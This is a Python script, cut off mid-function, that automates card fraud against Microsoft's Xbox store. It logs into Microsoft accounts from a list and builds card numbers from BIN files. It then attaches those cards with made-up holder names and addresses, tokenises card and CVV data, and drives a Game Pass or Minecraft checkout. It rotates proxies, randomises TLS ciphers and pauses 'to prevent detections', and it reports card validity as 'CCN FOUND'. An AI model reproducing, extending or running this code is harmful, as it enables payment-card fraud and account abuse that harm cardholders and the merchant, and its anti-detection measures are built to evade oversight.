import json,os,random,re, sys,threading,time,certifi,colorama,httpx,requests,urllib3
from datetime import datetime
from random import randint
from uuid import uuid4
from colorama import Fore
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.ssl_ import create_urllib3_context
from modules.cashe import *
from modules.utils import *


# --------------------------------------------|----------------|
# Subscription Tier          | ProductID       |    Skuids     |
# ---------------------------------------------|---------------|
# PC Game Pass               | CFQ7TTC0KGQ8    |       0002    |
# Xbox Game Pass Ultimate    | CFQ7TTC0KHS0    |       0007    |
# Minecraft                  | 9NXP44L49SHJ    |       0010    |  
# --------------------------------------------------------------

def sprint(content: str, status: str = "c") -> None:
    colour = Fore.CYAN
    current_time = datetime.now().strftime("%H:%M:%S")
    if status == "y":
        colour = Fore.YELLOW
    elif status == "c":
        colour = Fore.CYAN
    elif status == "r":
        colour = Fore.RED
    elif status == "new":
        colour = Fore.LIGHTYELLOW_EX
    with thread_lock:
        sys.stdout.write(f"{current_time} | {colour}{content}{Fore.RESET}\n")

#ok here ssl context lele
ORIGIN_CIPHERS = ('ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:' 'DH+HIGH:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+HIGH:RSA+3DES')
class SSLContext(object):
    def GetContext():
        ciphers_top = "ECDH+AESGCM:ECDH+CHACHA20:DH+AESGCM"
        ciphers_mid = 'DH+CHACHA20:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:DH+HIGH:RSA+AESGCM:RSA+AES:RSA+HIGH:!aNULL:!eNULL:!MD5:!3DES'
        cl = ciphers_mid.split(":")
        cl_len = len(cl)
        els = []
        
        for i in range(cl_len):
            idx = randint(0, cl_len-1)
            els.append(cl[idx])
            del cl[idx]
            cl_len-=1
        ciphers2 = ciphers_top+":".join(els)
        context = httpx.create_ssl_context()
        context.load_verify_locations(cafile=certifi.where())
        context.set_alpn_protocols(["h2"])
        context.minimum_version.MAXIMUM_SUPPORTED
        CIPHERS = ciphers2
        context.set_ciphers(CIPHERS)
        ciphers2
    
    def GetTransport():
        return httpx.HTTPTransport(retries=3)

class DESAdapter(HTTPAdapter):
    def __init__(self, *args, **kwargs):
        CIPHERS = ORIGIN_CIPHERS.split(':')
        random.shuffle(CIPHERS)
        CIPHERS = ':'.join(CIPHERS)
        self.CIPHERS = CIPHERS + ':!aNULL:!eNULL:!MD5'
        super().__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        context = create_urllib3_context(ciphers=self.CIPHERS)
        kwargs['ssl_context'] = context
        return super(DESAdapter, self).init_poolmanager(*args, **kwargs)

    def proxy_manager_for(self, *args, **kwargs):
        context = create_urllib3_context(ciphers=self.CIPHERS)
        kwargs['ssl_context'] = context
        return super(DESAdapter, self).proxy_manager_for(*args, **kwargs)

urllib3.disable_warnings() #disable warnings
thread_lock = threading.Lock() #thread lock
cfg = json.loads(open("config.json").read())
ua : str = cfg["user-agent"]
ua = cfg["user-agent"]
request_exceptions = (requests.exceptions.ProxyError, requests.exceptions.Timeout, requests.exceptions.SSLError)
productId = cfg["product_id"]
skuid = cfg["skuid"]
use_proxy = cfg["use_proxy"]

total_proxies = len(open("proxies.txt").readlines())
if use_proxy.lower() == "true":
	use_proxy = True
	sprint("Using proxies", "y")
	sprint("Loaded " + str(total_proxies) + " proxies", "y")
else:
	use_proxy = False


def clear():
	os.system('cls' if os.name == 'nt' else 'clear')

clear()

def GetProxy():
    with open('proxies.txt', "r") as f:
        return random.choice(f.readlines()).strip()
    
def GetFormattedProxy(proxy):
        if '@' in proxy:
            return proxy
        elif len(proxy.split(':')) == 2:
            return proxy
        else:
            if '.' in proxy.split(':')[0]:
                return ':'.join(proxy.split(':')[2:]) + '@' + ':'.join(proxy.split(':')[:2])
            else:
                return ':'.join(proxy.split(':')[:2]) + '@' + ':'.join(proxy.split(':')[2:])    


def main(ms_creds: str):
	fullBin = random.choice(open("bins.txt").readlines()).strip()
	cardBin = fullBin.split("|")[0].replace("x","")
	binMonth = fullBin.split("|")[1]
	binYear = fullBin.split("|")[2]
	cvv = fullBin.split("|")[3]
	locale  = fullBin.split("|")[4]
	postal_code  = fullBin.split("|")[5]
	country_sm = locale.split("-")[1].lower()
	full_card = getValidCard(cardBin, binMonth, binYear, cvv)
	s = requests.Session()
	s.mount("https://", DESAdapter())
	if use_proxy:
		peoxy = GetProxy()
		proxy_str = peoxy
		proxies = GetFormattedProxy(proxy_str)
		s.proxies  = {
			 'http': 'http://' + proxies,
			 'https': 'http://' + proxies
			 }
	email = ms_creds.split("|")[0]
	password = ms_creds.split("|")[1]
	card = full_card.split("|")[0]
	exp_month = full_card.split("|")[1]
	exp_year = full_card.split("|")[2]
	cvv = full_card.split("|")[3]
	if card.startswith("4"):
		card_type = "visa"
	elif card.startswith("5"):
		card_type = "mc"
	elif card.startswith("6"):
		card_type = "amex"
	else:
		sprint("[-] Unsupported card!", "y")
		return
	
	headers = {
	 'Accept':
	 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
	 'Accept-Language': 'en-US,en;q=0.9',
	 'Connection': 'keep-alive',
	 'Sec-Fetch-Dest': 'document',
	 'Accept-Encoding': 'identity',
	 'Sec-Fetch-Mode': 'navigate',
	 'Sec-Fetch-Site': 'none',
	 'Sec-Fetch-User': '?1',
	 'Sec-GPC': '1',
	 'Upgrade-Insecure-Requests': '1',
	 'User-Agent': ua,
	}

	while True:
		try:
			response = s.get('https://login.live.com/ppsecure/post.srf',
			                 headers=headers,
			                 timeout=20).text
			break
		except request_exceptions:
			continue
		except Exception as e:
			sprint(str(e), "r")
			return
	try:
		ppft = response.split(
		 ''''<input type="hidden" name="PPFT" id="i0327" value="''')[1].split('"')[0]
		log_url = response.split(",urlPost:'")[1].split("'")[0]
	except:
		sprint("[-] Unknown Error (Proxies probably banned)")
		return
	log_data = f'i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=449894'
	headers = {
	 'Accept':
	 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
	 'Accept-Language': 'en-US,en;q=0.9',
	 'Cache-Control': 'max-age=0',
	 'Connection': 'keep-alive',
	 'Content-Type': 'application/x-www-form-urlencoded',
	 'Origin': 'https://login.live.com',
	 'Referer': 'https://login.live.com/',
	 'Sec-Fetch-Dest': 'document',
	 'Sec-Fetch-Mode': 'navigate',
	 'Sec-Fetch-Site': 'same-origin',
	 'Sec-Fetch-User': '?1',
	 'Sec-GPC': '1',
	 'Upgrade-Insecure-Requests': '1',
	 'User-Agent': ua,
	}
	while True:
		try:
			response = s.post(log_url, timeout=20, data=log_data, headers=headers).text
			break
		except request_exceptions:
			continue
		except Exception as e:
			sprint(e, "r")
			return

	try:
		ppft2 = re.findall("sFT:'(.+?(?=\'))", response)[0],
		url_log2 = re.findall("urlPost:'(.+?(?=\'))", response)[0]
	except:
		sprint("[-] Invalid microsoft acc!", "c")
		remove_content("accs.txt", ms_creds)
		return

	log_data2 = {
	 "LoginOptions": "3",
	 "type": "28",
	 "ctx": "",
	 "hpgrequestid": "",
	 "PPFT": ppft2,
	 "i19": "19130"
	}
	headers = {
	 'Accept':
	 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
	 'Accept-Language': 'en-US,en;q=0.9',
	 'Cache-Control': 'max-age=0',
	 'Connection': 'keep-alive',
	 'Content-Type': 'application/x-www-form-urlencoded',
	 'Origin': 'https://login.live.com',
	 'Referer': log_url,
	 'Sec-Fetch-Dest': 'document',
	 'Sec-Fetch-Mode': 'navigate',
	 'Sec-Fetch-Site': 'same-origin',
	 'Sec-Fetch-User': '?1',
	 'Sec-GPC': '1',
	 'Upgrade-Insecure-Requests': '1',
	 'User-Agent': ua,
	}
	while True:
		try:
			midAuth2 = s.post(url_log2, timeout=20, data=log_data2,
			                  headers=headers).text
			break
		except request_exceptions:
			continue
		except Exception as e:
			sprint(e, "r")
			return
	heads = {
	 'Accept':
	 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
	 'Accept-Language': 'en-US,en;q=0.9',
	 'Connection': 'keep-alive',
	 'Sec-Fetch-Dest': 'document',
	 'Sec-Fetch-Mode': 'navigate',
	 'Sec-Fetch-Site': 'none',
	 'Sec-Fetch-User': '?1',
	 'Sec-GPC': '1',
	 'Upgrade-Insecure-Requests': '1',
	 'User-Agent': ua,
	}
	while True:
		try:
			response = s.get("https://account.xbox.com/", timeout=20,
			                 headers=heads).text
			break
		except request_exceptions:
			continue
		except Exception as e:
			sprint(e, "r")
			return
	try:
		xbox_json = {
		 "fmHF": response.split('id="fmHF" action="')[1].split('"')[0],
		 "pprid": response.split('id="pprid" value="')[1].split('"')[0],
		 "nap": response.split('id="NAP" value="')[1].split('"')[0],
		 "anon": response.split('id="ANON" value="')[1].split('"')[0],
		 "t": response.split('id="t" value="')[1].split('"')[0]
		}
	except:
		sprint("IP banned on https://account.xbox.com/", "y")
		return
	heads = {
	 'Accept':
	 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
	 'Accept-Language': 'en-US,en;q=0.9',
	 'Cache-Control': 'max-age=0',
	 'Connection': 'keep-alive',
	 'Origin': 'https://login.live.com',
	 'Referer': 'https://login.live.com/',
	 'Sec-Fetch-Dest': 'document',
	 'Sec-Fetch-Mode': 'navigate',
	 'Sec-Fetch-Site': 'cross-site',
	 'Sec-GPC': '1',
	 'Upgrade-Insecure-Requests': '1',
	 'User-Agent': ua,
	}
	while True:
		try:
			verify_token = s.post(xbox_json['fmHF'],
			                      timeout=20,
			                      headers={
			                       'Content-Type': 'application/x-www-form-urlencoded',
			                      },
			                      data={
			                       "pprid": xbox_json['pprid'],
			                       "NAP": xbox_json['nap'],
			                       "ANON": xbox_json['anon'],
			                       "t": xbox_json['t']
			                      }).text
			break
		except request_exceptions:
			continue
		except Exception as e:
			sprint(e, "r")
			return

	reqVerifytoken = verify_token.split(
	 'name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
	heads = {
	 'Accept': 'application/json, text/javascript, */*; q=0.01',
	 'Accept-Language': 'en-US,en;q=0.9',
	 'Connection': 'keep-alive',
	 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	 'Origin': 'https://account.xbox.com',
	 'Referer': xbox_json['fmHF'],
	 'Sec-Fetch-Dest': 'empty',
	 'Sec-Fetch-Mode': 'cors',
	 'Sec-Fetch-Site': 'same-origin',
	 'Sec-GPC': '1',
	 'User-Agent': ua,
	 'X-Requested-With': 'XMLHttpRequest',
	 '__RequestVerificationToken': reqVerifytoken,
	}
	while True:
		try:
			make_acc = s.post(
			 "https://account.xbox.com/en-us/xbox/account/api/v1/accountscreation/CreateXboxLiveAccount",
			 timeout=20,
			 headers=heads,
			 data={
			  "partnerOptInChoice": "false",
			  "msftOptInChoice": "false",
			  "isChild": "true",
			  "returnUrl": "https://www.xbox.com/en-US/?lc=1033"
			 })
			break
		except request_exceptions:
			continue
		except Exception as e:
			sprint(e, "r")
			return
	if not make_acc.ok:
		sprint("[-] Failed to create XBOX profile!")
		return
	heads = {
	 'Accept':
	 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
	 'Accept-Language': 'en-US,en;q=0.9',
	 'Connection': 'keep-alive',
	 'Sec-Fetch-Dest': 'document',
	 'Sec-Fetch-Mode': 'navigate',
	 'Sec-Fetch-Site': 'none',
	 'Sec-Fetch-User': '?1',
	 'Sec-GPC': '1',
	 'Upgrade-Insecure-Requests': '1',
	 'User-Agent': ua,
	}
	while True:
		try:
			response = s.get(
			 f"https://account.xbox.com/{locale}/auth/getTokensSilently?rp=http://xboxlive.com,http://mp.microsoft.com/,http://gssv.xboxlive.com/,rp://gswp.xboxlive.com/,http://sisu.xboxlive.com/",
			 timeout=20).text
			break
		except request_exceptions:
			continue
		except Exception as e:
			sprint(e, "r")
			return
	try:
		rel = response.split('"http://mp.microsoft.com/":{')[1].split('},')[0]
		json_obj = json.loads("{" + rel + "}")
		xbl_auth = "XBL3.0 x=" + json_obj['userHash'] + ";" + json_obj['token']
		xbl_auth2 = str({"XToken": xbl_auth})
	except:
		sprint("[-] Failed to get XBL Authorization", "y")
		remove_content("accs.txt", ms_creds)
		return

	while True:
		try:
			cvv_id = s.post("https://tokenization.cp.microsoft.com/tokens/cvv/getToken",
			                timeout=20,
			                json={
			                 "data": cvv
			                }).json()["data"]
			break
		except request_exceptions:
			continue
		except KeyError:
			sprint(f"[-] Error while getting CVV token", "c")
			return
		except Exception as e:
			sprint(e, "r")
			return
	while True:
		try:
			card_id = s.post(
			 "https://tokenization.cp.microsoft.com/tokens/pan/getToken",
			 timeout=20,
			 json={"data": card})
			card_id = card_id.json()["data"]

			break
		except request_exceptions:
			continue
		except KeyError:
			sprint(f"[-] Error while getting Pan token", "c")
			sprint(card_id.text)
			return
		except Exception as e:
			sprint(e, "r")
			return

	headers = {
	 'Accept': '*/*',
	 'Accept-Language': 'en-US,en;q=0.9',
	 'Connection': 'keep-alive',
	 'Origin': 'https://account.microsoft.com',
	 'Referer': 'https://account.microsoft.com/',
	 'Sec-Fetch-Dest': 'empty',
	 'Sec-Fetch-Mode': 'cors',
	 'Sec-Fetch-Site': 'same-site',
	 'User-Agent': ua,
	 'authorization': xbl_auth,
	 'content-type': 'application/json',
	 'correlation-context':
	 f'v=1,ms.b.tel.scenario=commerce.payments.PaymentInstrumentAdd.1,ms.b.tel.partner=webblends,ms.c.cfs.payments.partnerSessionId={str(uuid4())}',
	 'sec-ch-ua-mobile': '?0',
	 'sec-ch-ua-platform': '"Windows"',
	 'x-ms-pidlsdk-version': '1.22.0-alpha.86_reactview',
	}

	params = {
	 'type': 'visa,amex,mc',
	 'partner': 'webblends',
	 'operation': 'Add',
	 'country': country_sm,
	 'language': locale,
	 'family': 'credit_card',
	 'completePrerequisites': 'true',
	}

	while True:
		try:
			response = s.get(
			 'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentMethodDescriptions',
			 params=params,
			 headers=headers,
			 timeout=20)
			break
		except request_exceptions:
			continue
		except Exception as e:
			sprint(e, "r")
			return
	heads = {
	 'Accept': '*/*',
	 'Accept-Language': 'en-US,en;q=0.7',
	 'Connection': 'keep-alive',
	 'Origin': 'https://account.microsoft.com',
	 'Referer': 'https://account.microsoft.com/',
	 'Sec-Fetch-Dest': 'empty',
	 'Sec-Fetch-Mode': 'cors',
	 'Sec-Fetch-Site': 'same-site',
	 'Sec-GPC': '1',
	 'User-Agent': ua,
	 'authorization': xbl_auth,
	 'content-type': 'application/json',
	 'correlation-context':
	 f'v=1,ms.b.tel.scenario=commerce.payments.PaymentInstrumentAdd.1,ms.b.tel.partner=webblends,ms.c.cfs.payments.partnerSessionId={str(uuid4())}',
	 'x-ms-pidlsdk-version': '1.22.0-alpha.86_reactview',
	}
	vcc_json = {
    'paymentMethodFamily': 'credit_card',
    'paymentMethodType':card_type,
    'paymentMethodOperation': 'add',
    'paymentMethodCountry': country_sm,
    'paymentMethodResource_id': f'credit_card.{card_type}',
    'sessionId': str(uuid4()),
    'context': 'purchase',
    'riskData': {
        'dataType': 'payment_method_riskData',
        'dataOperation': 'add',
        'dataCountry': country_sm,
        'greenId': str(uuid4()),
    },
    'details': {
        'dataType': 'credit_card_visa_details',
        'dataOperation': 'add',
        'dataCountry': country_sm,
        'accountHolderName': getRandomLetters(7).upper()+" "+getRandomLetters(5).upper(),
        'accountToken': card_id,
        'expiryMonth': exp_month,
        'expiryYear': exp_year,
        'cvvToken': cvv_id,
        'address':{
            'addressType': 'billing',
            'addressOperation': 'add',
            'addressCountry': country_sm,
            'address_line1': "CASA DE JANOS NO. 1530, TORIBIO ORTEGA, 32675",
            'city': 'Chihuahua',
            'region': 'ch',
            'postal_code': postal_code,
            'country': country_sm,
        },
        'permission': {
            'dataType': 'permission_details',
            'dataOperation': 'add',
            'dataCountry': country_sm,
            'hmac': {
                'algorithm': 'hmacsha256',
                'keyToken': 'null',
                'data': 'null',
            },
            'userCredential': xbl_auth,
        },
        'currentContext': str({
	"id": "credit_card.",
	"instance": "null",
	"backupId": "null",
	"backupInstance": "null",
	"action": "addResource",
	"paymentMethodFamily": "credit_card",
	"paymentMethodType": "null",
	"resourceActionContext": {
		"action": "addResource",
		"pidlDocInfo": {
			"anonymousPidl": "false",
			"resourceType": "paymentMethod",
			"parameters": {
				"type": "visa,amex,mc",
				"partner": "webblends",
				"operation": "Add",
				"country": country_sm,
				"language": locale,
				"family": "credit_card",
				"completePrerequisites": "true"
			}
		},
		"pidlIdentity": "null",
		"resourceInfo": "null",
		"resourceObjPath": "null",
		"resource": "null",
		"prefillData": "null"
	},
	"partnerHints": "null",
	"prefillData": "null",
	"targetIdentity": "null"
}),
    },
    'pxmac': response.json()[0]["data_description"]["pxmac"]["default_value"],
}
	params = {
	 'country': country_sm,
	 'language': locale,
	 'partner': 'webblends',
	 'completePrerequisites': 'True',
	}
	while True:
		try:
			vcc_req = s.post(
			 'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx',
			 params=params,
			 headers=heads,
			 json=vcc_json,
			 timeout=30)
			break
		except request_exceptions:
			continue
		except Exception as e:
			sprint(e, "r")
	if not vcc_req.ok:
		if "InvalidRequestData" in vcc_req.text:
			sprint("[-] Failed - INVALID CARD DATA", "r")
		elif "ValidationFailed" in vcc_req.text:
			sprint("[-] Failed - CARD VALIDATION FAILED", "r")
		elif "InvalidCvv" in vcc_req.text:
			sprint("[-] Failed - INVALID CVV | CCN FOUND", "r")
		else:
			sprint("[-] Failed - UNKNOWN ERROR", "r")
			sprint(vcc_req.text, "r")
		return
	sprint("[+] Added card | Last 4: " + card[-4:], "g")
	sprint("Sleeping to prevent detections",'y')
	time.sleep(2)

	prof_headers = {
	 'Accept': '*/*',
	 'Accept-Language': 'en-US,en;q=0.9',
	 'Connection': 'keep-alive',
	 'Origin': 'https://www.microsoft.com',
	 'Referer': 'https://www.microsoft.com/',
	 'Sec-Fetch-Dest': 'empty',
	 'Sec-Fetch-Mode': 'cors',
	 'Sec-Fetch-Site': 'same-site',
	 'Sec-GPC': '1',
	 'User-Agent': ua,
	 'authorization': xbl_auth,
	 'correlation-context':
	 'v=1,ms.b.tel.scenario=commerce.payments.AddressAdd.1,ms.b.tel.partner=AccountMicrosoftCom,ms.c.cfs.payments.partnerSessionId=d8VcHbeGb0e90kU9',
	 'ms-correlationid': str(uuid4()),
	 'ms-requestid': str(uuid4()),
	 'x-ms-pidlsdk-version': '1.21.2_jqueryview',
	}

	prof_params = {
	 'partner': 'webblends',
	 'language': 'en-US',
	 'avsSuggest': 'true',
	}

	prof_json_data = {
	 'addressType':
	 'billing',
	 'addressCountry':
	 'us',
	 'address_line1':
	 getRandomLetters(100) + " " + getRandomLetters(5) + " " + getRandomInt(3),
	 'city':
	 'New York',
	 'region':
	 'ny',
	 'postal_code':
	 postal_code,
	 'country':
	 country_sm,
	 'set_as_default_billing_address':
	 'True',
	}

	while True:
		try:
			prof_response = s.post(
			 'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/addressesEx',
			 params=prof_params,
			 headers=prof_headers,
			 json=prof_json_data,
			 timeout=30)
			break
		except request_exceptions:
			continue
		except Exception as e:
			sprint(e, "y")
			return
	if not prof_response.ok:
		sprint('[-] Failed to set billing address!', "c")
		sprint(prof_response.text, "y")
		return
	prof_final_headers = {
	 'Accept': '*/*',
	 'Accept-Language': 'en-US,en;q=0.9',
	 'Connection': 'keep-alive',
	 'Origin': 'https://www.microsoft.com',
	 'Referer': 'https://www.microsoft.com/',
	 'Sec-Fetch-Dest': 'empty',
	 'Sec-Fetch-Mode': 'cors',
	 'Sec-Fetch-Site': 'same-site',
	 'Sec-GPC': '1',
	 'User-Agent': ua,
	 'authorization': xbl_auth,
	 'correlation-context':
	 'v=1,ms.b.tel.scenario=commerce.payments.AddressAdd.1,ms.b.tel.partner=AccountMicrosoftCom,ms.c.cfs.payments.partnerSessionId=d8VcHbeGb0e90kU9',
	 'ms-correlationid': str(uuid4()),
	 'ms-requestid': str(uuid4()),
	 'x-ms-pidlsdk-version': '1.21.2_jqueryview',
	}

	prof_final_params = {
	 'partner': 'webblends',
	 'language': locale,
	 'avsSuggest': 'False',
	}

	prof_final_json_data = {
	 'set_as_default_shipping_address':
	 False,
	 'set_as_default_billing_address':
	 True,
	 'is_user_entered':
	 True,
	 'id':
	 'entered',
	 'country':
	 country_sm,
	 'region':
	 'ny',
	 'city':
	 'New York',
	 'address_line1':
	 'Street ' + getRandomLetters(5) + " " + getRandomInt(3),
	 'postal_code':
	 postal_code,
	 'is_customer_consented':
	 True,
	 'is_avs_full_validation_succeeded':
	 False,
	}

	while True:
		try:
			prof_final_response = s.post(
			 'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/addressesEx',
			 timeout=30,
			 params=prof_final_params,
			 headers=prof_final_headers,
			 json=prof_final_json_data)
			break
		except request_exceptions:
			continue
		except Exception as e:
			sprint(e, "r")
			return

	if not prof_final_response.ok:
		sprint('[-] Failed to set billing address!', "c")
		sprint(prof_final_response.text, "y")
		return

	headers = {
	 'authority': 'www.microsoft.com',
	 'accept':
	 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	 'accept-language': 'en-US,en;q=0.9',
	 'cache-control': 'max-age=0',
	 'origin': 'https://www.xbox.com',
	 'referer': 'https://www.xbox.com/',
	 'sec-ch-ua':
	 '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
	 'sec-ch-ua-mobile': '?0',
	 'sec-ch-ua-platform': '"Windows"',
	 'sec-fetch-dest': 'iframe',
	 'sec-fetch-mode': 'navigate',
	 'sec-fetch-site': 'cross-site',
	 'sec-fetch-user': '?1',
	 'upgrade-insecure-requests': '1',
	 'user-agent': ua,
	}

	params = {
	 'noCanonical': 'true',
	 'market': locale.split('-')[1],
	 'locale': locale,
	}

	headers = {
	 'Accept':
	 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
	 'Accept-Language': 'en-US,en;q=0.6',
	 'Cache-Control': 'max-age=0',
	 'Connection': 'keep-alive',
	 'Referer': 'https://login.live.com/',
	 'Sec-Fetch-Dest': 'document',
	 'Sec-Fetch-Mode': 'navigate',
	 'Sec-Fetch-Site': 'cross-site',
	 'Sec-GPC': '1',
	 'Upgrade-Insecure-Requests': '1',
	 'User-Agent': ua,
	 'sec-ch-ua': '"Not_A Brand";v="99", "Brave";v="109", "Chromium";v="109"',
	 'sec-ch-ua-mobile': '?0',
	 'sec-ch-ua-platform': '"Windows"',
	}

	while True:
		try:
			response = s.get(f'https://www.xbox.com/{locale}/xbox-game-pass',
			                 headers=headers)
			break
		except request_exceptions:
			continue
		except Exception as e:
			sprint(e, "r")
			return
	anonToken = response.text.split('"anonToken":"')[1].split('","')[0]
	headers = {
	 'authority': 'emerald.xboxservices.com',
	 'accept': '*/*',
	 'accept-language': 'en-US,en;q=0.9',
	 'authorization': xbl_auth,
	 "ms-cv": "BX1+FrPZZt2eSrZyAU9FE+.7",
	 'origin': 'https://www.xbox.com',
	 'referer': 'https://www.xbox.com/',
	 'sec-ch-ua':
	 '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
	 'sec-ch-ua-mobile': '?0',
	 'sec-ch-ua-platform': '"Windows"',
	 'sec-fetch-dest': 'empty',
	 'sec-fetch-mode': 'cors',
	 'sec-fetch-site': 'cross-site',
	 'user-agent': ua,
	 'x-ms-api-version': '1.0',
	 'x-s2s-authorization': f'Bearer ' + anonToken,
	}
	params = {
	 'locale': locale,
	}
	while True:
		try:
			response = s.get(
			 f'https://emerald.xboxservices.com/xboxcomfd/contextualStore/productDetails/{productId}',
			 params=params,
			 headers=headers,
			)
			break
		except request_exceptions:
			continue
		except Exception as e:
			sprint(e, "r")
			return

	avalibilityId = response.json()["productSummaries"][0]["specificPrices"][
	 "purchaseable"][0]["availabilityId"]
	params = {
	 'noCanonical': 'true',
	 'market': locale.split('-')[1],
	 'locale': locale,
	}
	data = {
	 'data':
	 '{"products":[{"productId":"' + productId +
	 '","skuId":' + f'"{skuid}","availabilityId":"' + avalibilityId +
	 '"}],"campaignId":"xboxcomct","callerApplicationId":"XboxCom","expId":["EX:sc_xboxgamepad","EX:sc_xboxspinner","EX:sc_xboxclosebutton","EX:sc_xboxuiexp","EX:sc_disabledefaultstyles","EX:sc_gamertaggifting"],"flights":["sc_xboxgamepad","sc_xboxspinner","sc_xboxclosebutton","sc_xboxuiexp","sc_disabledefaultstyles","sc_gamertaggifting"],"clientType":"XboxCom","data":{"usePurchaseSdk":"true"},"layout":"Modal","cssOverride":"XboxCom2NewUI","theme":"light","scenario":"","suppressGiftThankYouPage":"false"}',
	 'auth':
	 xbl_auth2,
	}
	while True:
		try:
			response = s.post('https://www.microsoft.com/store/buynow',
			                  timeout=30,
			                  params=params,
			                  headers=headers,
			                  data=data)
			break
		except request_exceptions:
			continue
		except Exception as e:
			sprint(e, "r")
			return
	if not response.ok:
		sprint(
		 "[-] Error while accessing buynow endpoint! Status code : {} (IP probably banned)"
		 .format(response.status_code), "c")
		return
	currencyCode = response.text.split('"currencyCode":"')[1].split('"')[0]
	pi_id = response.text.split('{"paymentInstrumentId":"')[1].split('"')[0]
	riskId = response.text.split('"riskId":"')[1].split('"')[0]
	cartId = response.text.split('"cartId":"')[1].split('"')[0]
	muid = response.text.split('"alternativeMuid":"')[1].split('"')[0]
	vectorId = response.text.split('"vectorId":"')[1].split('"')[0]
	corId = response.text.split('"correlationId":"')[1].split('"')[0]
	trackId = response.text.split('"trackingId":"')[1].split('"')[0]
	akkuId = response.text.split(',"accountId":"')[1].split('"')[0]
	id_id = response.text.split(',"soldToAddressId":"')[1].split('"')[0]
	ses_id = response.text.split('"sessionId":"')[1].split('"')[0]
	headers = {
	 'Accept': '*/*',
	 'Accept-Language': 'en-US,en;q=0.9',
	 'Connection': 'keep-alive',
	 'Origin': 'https://www.microsoft.com',
	 'Referer': 'https://www.microsoft.com/',
	 'Sec-Fetch-Dest': 'empty',
	 'Sec-Fetch-Mode': 'cors',
	 'Sec-Fetch-Site': 'same-site',
	 'User-Agent': ua,
	 'authorization': xbl_auth,
	 'content-type': 'application/json',
	 'correlation-context':
	 f'v=1,ms.b.tel.scenario=commerce.payments.PaymentSessioncreatePaymentSession.1,ms.b.tel.partner=XboxCom,ms.c.cfs.payments.partnerSessionId=ndstkS61HgKfmXpx8X9IP2',
	 'sec-ch-ua-mobile': '?0',
	 'sec-ch-ua-platform': '"Windows"',
	 'x-ms-flight': 'EnableThreeDSOne',
	 'x-ms-pidlsdk-version': '1.22.0_reactview',
	}
	payment_ses_data = {
	 "piid": vcc_req.json()["id"],
	 "language": locale,
	 "partner": "webblends",
	 "piCid": vcc_req.json()["accountId"],
	 "amount": 1,
	 "currency": currencyCode,
	 "country": country_sm.upper(),
	 "hasPreOrder": "false",
	 "challengeScenario": "RecurringTransaction",
	 "challengeWindowSize": "03",
	 "purchaseOrderId": cartId
	}

	params = {
	 'paymentSessionData': str(payment_ses_data),
	 'operation': 'Add',
	}

	while True:
		try:
			response = s.get(
			 'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/PaymentSessionDescriptions',
			 timeout=30,
			 params=params,
			 headers=headers,
			)
			break
		except request_exceptions:
			continue
		except Exception as e:
			sprint(e, "r")
			return
	if not response.ok:
		sprint("[-] Error while getting 3ds ID", "c")
		return
	threedsId = response.json()[0]["clientAction"]["context"]["id"]
	# s.proxies=None
	headers = {
	 'authority': 'cart.production.store-web.dynamics.com',
	 'accept': '*/*',
	 'accept-language': 'en-US,en;q=0.9',
	 'authorization': xbl_auth,
	 'content-type': 'application/json',
	 'ms-cv': generateHexStr(21) + "b.46.2",
	 'origin': 'https://www.microsoft.com',
	 'referer': 'https://www.microsoft.com/',
	 'sec-ch-ua-mobile': '?0',
	 'sec-ch-ua-platform': '"Windows"',
	 'sec-fetch-dest': 'empty',
	 'sec-fetch-mode': 'cors',
	 'sec-fetch-site': 'cross-site',
	 'user-agent': ua,
	 'x-authorization-muid': muid,
	 'x-ms-correlation-id': corId,
	 'x-ms-tracking-id': trackId,
	 'x-ms-vector-id': vectorId,
	}

	params = {
	 'cartId': cartId,
	 'appId': 'BuyNow',
	}

	json_data = {
	 'locale': locale,
	 'market': country_sm.upper(),
	 'catalogClientType': '',
	 'clientContext': {
	  'client': 'XboxCom',
	  'deviceFamily': 'Web',
	 },
	 'flights': prePareCartFlights,
	 'paymentInstrumentId': pi_id,
	 'csvTopOffPaymentInstrumentId': None,
	 'billingAddressId': {
	  'accountId': akkuId,
	  'id': id_id,
	 },
	 'sessionId': ses_id,
	 'orderState': 'CheckingOut',
	}

	while True:
		try:
			response = s.put(
			 'https://cart.production.store-web.dynamics.com/cart/v1.0/cart/updateCart',
			 timeout=60,
			 params=params,
			 headers=headers,
			 json=json_data,
			)
			break
		except request_exceptions:
			continue
		except Exception as e:
			sprint(e, "r")
			return
	if not response.ok:
